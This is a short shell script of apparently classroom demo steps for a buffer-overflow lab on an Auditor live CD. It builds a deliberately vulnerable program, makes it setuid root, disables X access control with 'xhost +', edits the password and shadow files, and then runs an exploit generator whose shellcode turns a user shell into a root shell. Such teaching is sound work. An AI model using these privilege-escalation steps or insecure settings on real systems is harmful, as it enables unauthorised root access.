
# for pmateti: cmds to use once inside Auditor

pmatetiDoNotRecord() {
    echo run this as root
    xhost +
    export DISPLAY=:0.0
    sed -i 's/knoppix/pmateti/g' /etc/passwd /etc/shadow /etc/group
    mkdir /home/pmateti
    chown pmateti -R /home/pmateti
    cp -fravp /root/BufferOverflow /home/pmateti
    cd /home/pmateti/BufferOverflow/2013
    make clean
    make
    chown root.root ./vulnerable.prg
    chmod +s ./vulnerable.prg
    su pmateti
    PS1='\w\n% '
    ls -l *.prg
    whoami
    ps
}

interactiveCutPaste() {
    ./exploit3.prg 612
    echo note the numbers and the changed prompt
    more ./vulnerable.c
    ./vulnerable
    echo note the address of buffer
    ./exploit3.prg 612 1640

    whoami
    echo still pmateti
    ps
    echo 4 processes bash exp3 bash ps
    echo $PS1
    echo $EGG | od -x -Ax
    echo $EGG > egg-exp3-gen.dat
    whoami
    ./vulnerable.prg $EGG
    echo note the prompt change
    whoami
    echo now i am root
    ps
    echo 3 processes bash sh ps
}
